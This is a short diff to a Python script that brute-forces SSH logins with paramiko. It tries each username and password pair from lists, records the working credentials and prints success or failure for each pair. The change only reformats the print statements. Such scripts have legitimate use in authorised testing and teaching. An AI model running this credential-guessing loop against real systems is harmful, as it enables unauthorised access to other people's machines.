@@ -38,17 +38,17 @@ while not correct_username or index_u < len(username_list):
             ssh_client = paramiko.client.SSHClient()
             ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh_client.connect(hostname=host_ip, username=username,password=password)
-            print('Success! [' + username + ":" + password + "]")
             correct_password = password
             correct_username = username
+            print('Success! [%s:%s]' %(correct_username,correct_password))
         
         except paramiko.AuthenticationException: #for wrong password
-            print('Failed [' + username + ":" + password+"]")
+            print('Failed [%s:%s]' %(username,password))
         except Exception as e: #for wrong passwordany other exceptions
             print('Error %s: username: %s, password: %s' %(e, username, password))
         finally:
             index_p=index_p+1
-            ssh_client.close()
+            ssh_client.close();
     index_p=0
     index_u=index_u+1
     
